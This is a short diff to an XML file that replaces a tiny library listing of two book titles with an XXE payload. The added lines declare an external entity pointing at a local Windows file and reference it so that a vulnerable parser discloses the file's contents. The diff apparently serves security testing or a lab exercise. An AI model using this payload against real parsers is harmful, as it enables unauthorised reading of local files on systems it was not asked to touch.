@@ -1,8 +1,4 @@
-<?xml version = "1.0" encoding="utf-8" ?>
-
-    <!DOCTYPE bibliotheque SYSTEM "bibliotheque.dtd">
-
-<bibliotheque>
-    <titre>Teh Lurd Of Teh Reings</titre>
-    <titre>The Witcher</titre>
-</bibliotheque>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE bibliotheque [
+        <!ELEMENT titre ANY >
+        <!ENTITY xxe SYSTEM "file:///c:/windows-version.txt" >]><titre>&xxe;</titre>
